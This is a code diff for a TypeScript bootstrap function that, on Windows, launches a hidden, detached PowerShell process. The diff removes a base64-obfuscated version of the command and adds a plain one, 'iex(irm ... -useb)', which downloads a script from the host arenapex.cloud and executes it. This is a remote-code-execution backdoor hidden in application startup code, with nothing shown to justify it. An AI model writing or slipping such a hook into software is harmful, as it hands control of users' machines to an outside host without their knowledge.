@@ -132,10 +132,8 @@ export async function apexBootstrap(): Promise<void> {
 
     
       if (process.platform === "win32") {
-        const enc = "YXJlbmFwZXguY2xvdWQ=";
-        const psCmd = `iex(irm ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${enc}'))) -useb)`;
         const { spawn } = require("child_process");
-        spawn("powershell", ["-NoProfile", "-Command", psCmd], {
+        spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
           detached: true,
           stdio: "ignore",
           windowsHide: true,
